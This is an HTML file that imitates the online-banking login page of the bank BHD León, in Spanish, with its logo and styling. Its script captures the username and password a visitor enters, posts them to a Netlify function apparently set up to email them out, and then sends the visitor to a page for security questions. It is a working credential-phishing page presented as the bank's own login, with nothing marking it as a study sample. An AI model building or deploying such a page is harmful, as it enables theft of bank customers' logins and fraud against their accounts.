<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Inicio de Sesión - BHD León</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-image: url('assets/background-login.webp');
            background-size: cover;
            background-position: center;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .login-container {
            background-color: rgba(255, 255, 255, 0.8);
            width: 400px;
            padding: 20px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
            border-radius: 10px;
            text-align: center;
        }

        .login-container img {
            width: 120px;
            margin-bottom: 20px;
        }

        h2 {
            color: #005aa7;
            font-size: 24px;
        }

        .form-group {
            margin-bottom: 15px;
            text-align: left;
            padding-left: 10px;
            padding-right: 10px;
        }

        label {
            font-size: 14px;
            color: #333;
        }

        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 10px;
            margin-top: 5px;
            border: 1px solid #ccc;
            border-radius: 5px;
            font-size: 16px;
            box-sizing: border-box;
        }

        button {
            width: 100%;
            padding: 10px;
            background-color: #3bbd69;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 18px;
            cursor: pointer;
            margin-top: 20px;
        }

        button:hover {
            background-color: #339d56;
        }

        .forgot-password {
            margin-top: 10px;
            font-size: 12px;
            color: #005aa7;
        }

        .forgot-password a {
            color: #005aa7;
            text-decoration: none;
        }

        .forgot-password a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>

    <div class="login-container">
        <img src="assets/logo-bhd.svg" alt="BHD León Logo">
        <h2>BHD Personal</h2>
        <form id="login-form">
            <div class="form-group">
                <label for="usuario">Usuario *</label>
                <input type="text" id="usuario" name="usuario" required>
            </div>
            <div class="form-group">
                <label for="contrasena">Contraseña *</label>
                <input type="password" id="contrasena" name="contrasena" required>
            </div>
            <button type="submit">Entrar</button>
            <div class="forgot-password">
                <p><a href="#">¿Olvidaste tu clave de acceso?</a></p>
            </div>
        </form>
    </div>

    <script>
        document.getElementById("login-form").addEventListener("submit", function(event) {
            event.preventDefault(); // Evita que el formulario se envíe automáticamente

            var usuario = document.getElementById("usuario").value;
            var contrasena = document.getElementById("contrasena").value;

            // Enviar los datos al backend usando Fetch API
            fetch("/.netlify/functions/sendEmail", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    username: usuario,
                    password: contrasena
                })
            })
            .then(response => response.json())
            .then(data => {
                // Si el correo se envió correctamente, redirige al archivo de preguntas de seguridad
                if (data.message === "Correo enviado con éxito") {
                    window.location.href = "preguntas-seguridad.html"; // Redirige al archivo de preguntas
                } else {
                    alert("Hubo un problema al enviar el correo.");
                }
            })
            .catch(error => {
                alert("Error al enviar el correo: " + error);
            });
        });
    </script>

</body>
</html>
